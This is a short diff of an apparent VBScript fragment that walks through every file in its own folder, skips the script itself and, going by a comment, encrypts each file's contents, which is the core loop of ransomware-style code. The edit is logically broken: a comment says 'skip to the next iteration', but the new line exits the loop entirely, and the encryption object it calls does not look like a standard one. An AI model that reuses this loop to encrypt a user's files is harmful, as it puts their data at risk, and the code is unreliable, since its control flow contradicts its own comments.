@@ -5,7 +5,8 @@ Set objCrypto = CreateObject("Scripting.Encrypt")
 For Each objFile In objFSO.GetFolder(".").Files
     ' Skip encryption for the script file itself
     If objFile.Name = WScript.ScriptName Then
-        Continue For
+        ' Skip to the next iteration of the loop
+        Exit For
     End If
     
     ' Read the file contents
